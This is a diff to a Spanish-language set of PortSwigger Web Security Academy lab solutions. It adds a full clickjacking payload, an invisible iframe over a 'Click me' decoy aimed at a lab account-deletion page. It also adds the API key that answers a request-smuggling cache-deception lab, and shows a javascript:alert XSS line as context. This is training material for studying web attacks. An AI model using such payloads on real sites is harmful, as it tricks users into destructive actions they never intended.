@@ -402,6 +402,32 @@ javascript:alert("1337")
 
 ## [Clickjacking](https://portswigger.net/web-security/clickjacking)
 
+### [Basic clickjacking with CSRF token protection](https://portswigger.net/web-security/clickjacking/lab-basic-csrf-protected)
+
+Este laboratorio contiene un botón para eliminar la cuenta el cual está protegido por un token CSRF. La intención es hacer que un usuario haga click en un iframe con opacidad baja para que elimine su cuenta.
+
+Para resolver este laboratorio, después de autenticarse con las credenciales provistas, dirigirse a Account Actions, y tomando esta url, la ponemos en el src del siguiente iframe.
+
+```html
+<style>
+  iframe {
+    position: relative;
+    width: 500px;
+    height: 700px;
+    opacity: 0.0001;
+    z-index: 2;
+  }
+  div {
+    position: absolute;
+    top: 370px;
+    left: 60px;
+    z-index: 1;
+  }
+</style>
+<div>Click me</div>
+<iframe src="https://ac411f041eabd7098042860e00170056.web-security-academy.net/account"></iframe>
+```
+
 ---
 
 ## [DOM-based vulnerabilities](https://portswigger.net/web-security/dom-based)
@@ -871,7 +897,7 @@ Host: LABID.web-security-academy.net
 
 ### [Exploiting HTTP request smuggling to perform web cache deception](https://portswigger.net/web-security/request-smuggling/exploiting/lab-perform-web-cache-deception)
 
-#### Solución:
+#### Descripción:
 
 1. Enviar la siguiente request:
 
@@ -890,6 +916,10 @@ foo: bar
 2. Ir al inicio del sitio web (LABID.web-security-academy.net/)
 3. Buscar entre las request realizadas las palabras "API Key" (se puede buscar a la derecha abajo de la response y recorrer todas las request o desde el menú Burp->Search si se tiene la versión Pro)
 4. Si se encuentra, enviar la API Key de la víctima como solución. Sino, repetir los pasos 1 a 3 (puede llevar muchas repeticiones del mismo proceso hasta que aparezca).
+
+#### Solución encontrada:
+
+6MM7nNMckO31arHOfLkLKJyGhNnKz2cl
 
 ---
 
